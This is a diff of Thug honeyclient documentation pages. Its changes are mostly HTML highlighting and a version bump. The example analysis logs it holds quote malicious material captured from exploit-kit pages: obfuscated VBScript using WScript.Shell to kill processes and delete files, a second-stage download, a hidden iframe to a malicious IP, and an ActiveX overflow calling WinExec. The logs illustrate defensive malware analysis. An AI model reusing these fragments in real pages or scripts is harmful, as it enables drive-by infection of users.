+Set w=CreateObject(StrReverse(&quot;llehS.&quot; &amp; &quot;tpi&quot;&amp;&quot;rcSW&quot;))
+Eval(Replace(&quot;W.ex2c b&quot;, Month(&quot;2010-02-16&quot;), &quot;E&quot;))
+W.eXeC &quot;taskkill /F /IM wm&quot; &amp; &quot;player.e&quot; &amp; &quot;xe&quot;:W.eXeC &quot;taskkill /F /IM realplay.ex&quot; &amp; &quot;e&quot;:Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; &quot;\&quot; &amp; StrReverse(&quot;bv.l&quot;) &amp; &quot;s&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;g.Delete&quot;)
 
 [2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d
 [2012-07-02 19:22:38] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:22:39] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
-[2012-07-02 19:22:39] &lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"&gt;&lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;&lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;&lt;param name="Play" value="0"&gt;&lt;/param&gt;&lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;&lt;/object&gt;
-[2012-07-02 19:22:39] &lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;
-[2012-07-02 19:22:39] &lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;
+[2012-07-02 19:22:39] &lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; height=&quot;10&quot; id=&quot;swf_id&quot; width=&quot;10&quot;&gt;&lt;param name=&quot;movie&quot; value=&quot;data/field.swf&quot;&gt;&lt;/param&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;&lt;/param&gt;&lt;param name=&quot;Play&quot; value=&quot;0&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;always&quot; height=&quot;10&quot; id=&quot;swf_id&quot; name=&quot;swf_id&quot; src=&quot;data/field.swf&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;10&quot;&gt;&lt;/embed&gt;&lt;/object&gt;
+[2012-07-02 19:22:39] &lt;param name=&quot;b&quot; value=&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;&gt;&lt;/param&gt;
+[2012-07-02 19:22:39] &lt;param name=&quot;movie&quot; value=&quot;data/field.swf&quot;&gt;&lt;/param&gt;
 [2012-07-02 19:22:39] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
 [2012-07-02 19:22:46] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:22:46] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
-[2012-07-02 19:22:46] &lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;
-[2012-07-02 19:22:46] &lt;param name="Play" value="0"&gt;&lt;/param&gt;
-[2012-07-02 19:22:46] &lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;
+[2012-07-02 19:22:46] &lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;&lt;/param&gt;
+[2012-07-02 19:22:46] &lt;param name=&quot;Play&quot; value=&quot;0&quot;&gt;&lt;/param&gt;
+[2012-07-02 19:22:46] &lt;embed allowscriptaccess=&quot;always&quot; height=&quot;10&quot; id=&quot;swf_id&quot; name=&quot;swf_id&quot; src=&quot;data/field.swf&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;10&quot;&gt;&lt;/embed&gt;
 [2012-07-02 19:22:46] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
 [2012-07-02 19:22:49] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:22:49] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
-[2012-07-02 19:22:49] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702192212</pre>
+[2012-07-02 19:22:49] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702192212
+</pre></div>
 </div>
 </div>
 <div class="section" id="local-analysis">
@@ -731,12 +805,12 @@ later (manual or automated) analysis (see also <em>Web Cache</em>)</p>
 <span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> <span class="o">[</span>Yahoo! Messenger 8.x Ywcvwr ActiveX<span class="o">]</span> Server Console Overflow
 <span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> UINT WINAPI WinExec <span class="o">(</span>
         <span class="nv">LPCSTR</span> <span class="o">=</span> <span class="nv">0x025d4b30</span> <span class="o">=</span>&gt;
-                <span class="o">=</span> <span class="s2">&quot;calc.exe&quot;</span>;
-        UINT <span class="nv">uCmdShow</span> <span class="o">=</span> 0;
-<span class="o">)</span> <span class="o">=</span>  32;
+                <span class="o">=</span> <span class="s2">&quot;calc.exe&quot;</span><span class="p">;</span>
+        UINT <span class="nv">uCmdShow</span> <span class="o">=</span> 0<span class="p">;</span>
+<span class="o">)</span> <span class="o">=</span>  32<span class="p">;</span>
 void ExitProcess <span class="o">(</span>
-        UINT <span class="nv">uExitCode</span> <span class="o">=</span> 0;
-<span class="o">)</span> <span class="o">=</span>  0;
+        UINT <span class="nv">uExitCode</span> <span class="o">=</span> 0<span class="p">;</span>
+<span class="o">)</span> <span class="o">=</span>  0<span class="p">;</span>
 
 <span class="o">[</span>2012-07-03 00:12:23<span class="o">]</span> Saving log analysis at ../logs/c8f4c752383eb87ac4381a4f3f101ca7/20120703001222
 </pre></div>
@@ -753,19 +827,19 @@ provides the <em>-x (&#8211;local-nofetch)</em> option to you. Let&#8217;s take 
 <span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;meta <span class="nv">content</span><span class="o">=</span><span class="s2">&quot;document&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;resource-type&quot;</span>/&gt;
 <span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/favicon.ico&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;shortcut icon&quot;</span>/&gt;
 <span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/favicon.ico <span class="o">(</span>Status: 204, Referrer: None<span class="o">)</span>
-<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/favicon.ico <span class="o">(</span>Content-type: text/plain; <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: d41d8cd98f00b204e9800998ecf8427e<span class="o">)</span>
+<span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/favicon.ico <span class="o">(</span>Content-type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: d41d8cd98f00b204e9800998ecf8427e<span class="o">)</span>
 <span class="o">[</span>2013-01-08 10:32:28<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css&quot;</span> <span class="nv">media</span><span class="o">=</span><span class="s2">&quot;screen&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span>/&gt;
 <span class="o">[</span>2013-01-08 10:32:29<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
-<span class="o">[</span>2013-01-08 10:32:29<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css <span class="o">(</span>Content-type: text/html; <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: 64f3fd00b16de9316bf2b7b57925f4ca<span class="o">)</span>
+<span class="o">[</span>2013-01-08 10:32:29<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/wp-content/themes/ad-flex-niche/skins/default/skin.css <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: 64f3fd00b16de9316bf2b7b57925f4ca<span class="o">)</span>
 <span class="o">[</span>2013-01-08 10:32:29<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/feed/&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;alternate&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;Groundhogtech RSS Feed&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;application/rss+xml&quot;</span>/&gt;
 <span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/feed/ <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
-<span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/feed/ <span class="o">(</span>Content-type: text/html; <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: 0f3dffbe75d901cf28d63f2e8c945815<span class="o">)</span>
+<span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/feed/ <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: 0f3dffbe75d901cf28d63f2e8c945815<span class="o">)</span>
 <span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;pingback&quot;</span>/&gt;
 <span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
-<span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php <span class="o">(</span>Content-type: text/html; <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: ce1ec1253cf77acb1a86d38c80a83ca2<span class="o">)</span>
+<span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: ce1ec1253cf77acb1a86d38c80a83ca2<span class="o">)</span>
 <span class="o">[</span>2013-01-08 10:32:30<span class="o">]</span> &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.groundhogtech.com/xmlrpc.php?rsd&quot;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;EditURI&quot;</span> <span class="nv">title</span><span class="o">=</span><span class="s2">&quot;RSD&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;application/rsd+xml&quot;</span>/&gt;
 <span class="o">[</span>2013-01-08 10:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php?rsd <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
-<span class="o">[</span>2013-01-08 10:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php?rsd <span class="o">(</span>Content-type: text/html; <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: d178bfd11bc1b88fc37be47b515210eb<span class="o">)</span>
+<span class="o">[</span>2013-01-08 10:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.groundhogtech.com/xmlrpc.php?rsd <span class="o">(</span>Content-type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8, MD5: d178bfd11bc1b88fc37be47b515210eb<span class="o">)</span>
 <span class="o">[</span>2013-01-08 10:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version<span class="o">=</span>0.8.9.8h <span class="o">(</span>Status: 200, Referrer: None<span class="o">)</span>
 <span class="o">[</span>2013-01-08 10:32:31<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://www.vklabs.com/wordpress-themes/show-version-xhtml-ad-flex-niche.php?version<span class="o">=</span>0.8.9.8h <span class="o">(</span>Content-type: text/html, MD5: cd382dd315e1c83a108dd8009bad9f70<span class="o">)</span>
 <span class="o">[</span>2013-01-08 10:32:32<span class="o">]</span> &lt;iframe <span class="nv">frameborder</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">height</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginheight</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">marginwidth</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nv">scrolling</span><span class="o">=</span><span class="s2">&quot;no&quot;</span> <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;http://81.95.149.27/go.php?sid=1&quot;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;border:0px solid gray;&quot;</span> <span class="nv">width</span><span class="o">=</span><span class="s2">&quot;0&quot;</span>&gt;&lt;/iframe&gt;
@@ -810,11 +884,11 @@ total 356K
 -rw-r--r-- 1 buffer buffer  15K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,data,ap1.php,f<span class="o">=</span>b081d,cd73e46d5d3ac64d00553aa7393808fc
 -rw-r--r-- 1 buffer buffer  25K Jul  2 19:18 <span class="o">[</span>omitted<span class="o">]</span>,data,ap2.php,39e5c34cd8c8c8791e2715c83f6a9cf3
 -rw-r--r-- 1 buffer buffer 1.3K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,data,field.swf,0887e8c1673cec525ce8aa694192e9c7
--rw-r--r-- 1 buffer buffer 1.1K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,data,hcp_vbs.php,f<span class="o">=</span>b081d&amp;d<span class="o">=</span>0,eec4de0470135e1d5de7eb1a76f2624b
+-rw-r--r-- 1 buffer buffer 1.1K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,data,hcp_vbs.php,f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">d</span><span class="o">=</span>0,eec4de0470135e1d5de7eb1a76f2624b
 -rw-r--r-- 1 buffer buffer  68K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,main.php,page<span class="o">=</span>8c6c59becaa0da07,baa880d8d79c3488f2c0557be24cca6b
 -rw-r--r-- 1 buffer buffer  51K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,Ryp.jar,1cc224d259fd079dc8fc964de421c9dd
--rw-r--r-- 1 buffer buffer  90K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,w.php,e<span class="o">=</span>5&amp;f<span class="o">=</span>b081d,6aa8d9e4db0d7b4433e791c898e7090e
--rw-r--r-- 1 buffer buffer  90K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,w.php,f<span class="o">=</span>b081d&amp;e<span class="o">=</span>2,af58f45673d97ba4643bb1c87c4505b2
+-rw-r--r-- 1 buffer buffer  90K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,w.php,e<span class="o">=</span>5<span class="p">&amp;</span><span class="nv">f</span><span class="o">=</span>b081d,6aa8d9e4db0d7b4433e791c898e7090e
+-rw-r--r-- 1 buffer buffer  90K Jul  2 19:22 <span class="o">[</span>omitted<span class="o">]</span>,w.php,f<span class="o">=</span>b081d<span class="p">&amp;</span><span class="nv">e</span><span class="o">=</span>2,af58f45673d97ba4643bb1c87c4505b2
 </pre></div>
 </div>
 </div>
@@ -899,12 +973,12 @@ option. Simply running Thug this way (please note the interval is expressed in m
         <li class="right" >
           <a href="configuration.html" title="Configuration"
              >previous</a> |</li>
-        <li><a href="index.html">Thug 0.5.4 documentation</a> &raquo;</li> 
+        <li><a href="index.html">Thug 0.5.5 documentation</a> &raquo;</li> 
       </ul>
     </div>
     <div class="footer">
         &copy; Copyright 2011-2014, Angelo Dell&#39;Aera.
-      Created using <a href="http://sphinx.pocoo.org/">Sphinx</a> 1.1.3.
+      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.2.2.
     </div>
   </body>
 </html>
